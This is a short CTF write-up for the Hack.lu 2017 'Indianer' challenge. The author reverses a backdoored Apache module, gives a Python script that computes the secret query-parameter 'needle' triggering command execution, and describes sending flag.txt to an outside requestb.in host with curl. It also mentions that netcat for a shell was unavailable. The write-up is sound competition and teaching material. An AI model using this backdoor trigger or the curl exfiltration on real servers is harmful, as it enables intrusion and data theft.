# [HACK.LU-CTF-2017] Indianer (Web, Pwn)
##### **Description :** Try to enter this Tipi
#
When we click on the given link, we land on a default installation page of an Apache/2.4.7

The download link gives us a Apache2 module binary named **backdoor.so**

We reverse the binary and stumble across the request processing function cleverly named **strlen()**

![strlen_function](https://git.adm.fr.clara.net/mdunnewind/Rot26-writeups/raw/master/CTF/hacklu/2017/web/indianer/imgs/reverse_eng.png)

After studying the request processing algorithm, we know that our request should look like this :
```
GET /index.html?[needle_value]=[command]
```

We also know how the needles are generated, let's use a quick python script to compute the first value :
```python
constante_6e = 0x6e
needle = [0]*256

for i in range(0,512,9) :
        needle[i % 35] = (((constante_6e & 1) + i) % 24) + 97
    	needle[35] = 0
        
print "".join(chr(x) for x in needle).strip('\0')[:34]
```
Which spits us this value : **dpdpdpamamamamajvjvjvjvgsgsgsgsgpd**

We can now grab flag.txt by sending it's content to a requestb.in with curl (netcat wasn't available to pop a shell :)

![strlen_function](https://git.adm.fr.clara.net/mdunnewind/Rot26-writeups/raw/master/CTF/hacklu/2017/web/indianer/imgs/burp_req.png)

Gotcha!

![strlen_function](https://git.adm.fr.clara.net/mdunnewind/Rot26-writeups/raw/master/CTF/hacklu/2017/web/indianer/imgs/reqbin.png)
